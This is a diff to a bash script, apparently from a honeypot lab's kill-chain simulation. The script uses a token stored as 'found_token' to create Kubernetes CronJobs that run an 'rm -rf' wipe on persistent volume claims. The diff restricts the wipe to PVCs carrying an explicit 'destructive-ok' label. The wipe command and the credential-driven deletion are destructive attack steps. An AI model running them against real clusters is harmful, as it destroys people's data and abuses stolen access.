@@ -7,6 +7,8 @@ IMAGE="alpine:3.20"
 WIPE_CMD='rm -rf /target/* /target/.[!.]* /target/..?* || true'
 CJ_PREFIX="wipe-pvc"
 CURL_TIMEOUT="20"
+DESTRUCTIVE_LABEL_KEY="${DESTRUCTIVE_LABEL_KEY:-honeypot.lab/destructive-ok}"
+DESTRUCTIVE_LABEL_VALUE="${DESTRUCTIVE_LABEL_VALUE:-true}"
 API_SERVER="https://$CONTROL_PLANE_NODE:$CONTROL_PLANE_PORT"
 
 TOKEN_FILE="$DATA_PATH/KC5/found_token"
@@ -48,6 +50,17 @@ urlencode () {
   printf '%s' "$1" | jq -sRr @uri
 }
 
+label_selector_query () {
+  local selector
+  selector="${DESTRUCTIVE_LABEL_KEY}=${DESTRUCTIVE_LABEL_VALUE}"
+  printf 'labelSelector=%s' "$(urlencode "${selector}")"
+}
+
+has_destructive_label () {
+  jq -e --arg key "${DESTRUCTIVE_LABEL_KEY}" --arg value "${DESTRUCTIVE_LABEL_VALUE}" \
+    '.metadata.labels[$key] == $value' >/dev/null
+}
+
 need_cmd () {
   command -v "$1" >/dev/null 2>&1 || { echo "Command not found: $1" >&2; exit 1; }
 }
@@ -55,8 +68,8 @@ need_cmd () {
 need_cmd jq
 
 # === Build the PVC list query ===
-echo ">> Getting PVC..."
-PVC_JSON="$(curl_k8s GET "/api/v1/persistentvolumeclaims" "" "")"
+echo ">> Getting PVC with ${DESTRUCTIVE_LABEL_KEY}=${DESTRUCTIVE_LABEL_VALUE}..."
+PVC_JSON="$(curl_k8s GET "/api/v1/persistentvolumeclaims" "" "$(label_selector_query)")"
 
 PVC_COUNT=$(echo "${PVC_JSON}" | jq -r '.items | length')
 if [[ "${PVC_COUNT}" -eq 0 ]]; then
@@ -87,6 +100,8 @@ make_cronjob_body () {
     "labels": {
       "app.kubernetes.io/name": "pvc-wiper",
       "app.kubernetes.io/managed-by": "custom-controller",
+      "honeypot.killchain/owned": "true",
+      "honeypot.killchain/id": "KC5",
       "pvc.kubernetes.io/name": "${pvc}"
     }
   },
@@ -101,6 +116,8 @@ make_cronjob_body () {
           "metadata": {
             "labels": {
               "app.kubernetes.io/name": "pvc-wiper",
+              "honeypot.killchain/owned": "true",
+              "honeypot.killchain/id": "KC5",
               "pvc.kubernetes.io/name": "${pvc}"
             }
           },
@@ -174,9 +191,17 @@ create_or_patch_cronjob () {
   echo "   -> patch applied"
 }
 
-# === Iterate over every PVC ===
-echo "${PVC_JSON}" | jq -r '.items[] | "\(.metadata.namespace);\(.metadata.name)"' | \
-while IFS=';' read -r ns pvc; do
+# === Iterate over explicitly allowed PVCs only ===
+echo "${PVC_JSON}" | jq -c '.items[]' | while read -r item; do
+  if ! printf '%s' "${item}" | has_destructive_label; then
+    ns="$(printf '%s' "${item}" | jq -r '.metadata.namespace // ""')"
+    pvc="$(printf '%s' "${item}" | jq -r '.metadata.name // ""')"
+    echo "   -> skip ${ns}/${pvc}: missing ${DESTRUCTIVE_LABEL_KEY}=${DESTRUCTIVE_LABEL_VALUE}"
+    continue
+  fi
+
+  ns="$(printf '%s' "${item}" | jq -r '.metadata.namespace // ""')"
+  pvc="$(printf '%s' "${item}" | jq -r '.metadata.name // ""')"
   [[ -z "$ns" || -z "$pvc" ]] && continue
   create_or_patch_cronjob "$ns" "$pvc"
 done
